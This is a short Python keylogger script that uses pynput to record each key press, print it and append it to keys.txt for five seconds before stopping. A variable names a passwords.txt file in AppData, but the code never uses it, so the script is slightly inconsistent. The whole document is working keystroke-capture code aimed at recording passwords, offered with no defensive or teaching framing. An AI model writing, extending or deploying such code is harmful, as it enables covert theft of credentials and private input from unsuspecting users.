
import os
from pynput.keyboard import Listener
from threading import Timer

file_to_write = os.environ['appdata'] + '\\passwords.txt'    # for running on Windows
#file_to_write = 'passwords.txt'      # for running on Linux and Mac

print("keylogger started.")
def on_press(key):
    k = str(key)
    k = k.replace("'", " ")
    k = k.replace("Key.backspace", "Backspace")
    k = k.replace("Key.enter", "\n")
    k = k.replace("Key.shift", "Shift")
    k = k.replace("Key.space", " ")
    k = k.replace("Key.caps_lock", "Caps Lock")
    
    print(k)
    file = open("keys.txt", "a")
    file.write(k)
    file.write('\n')
    file.close()

with Listener(on_press=on_press) as listener:
    Timer(5, listener.stop).start()
    listener.join()

print("keylogger shutdown.")
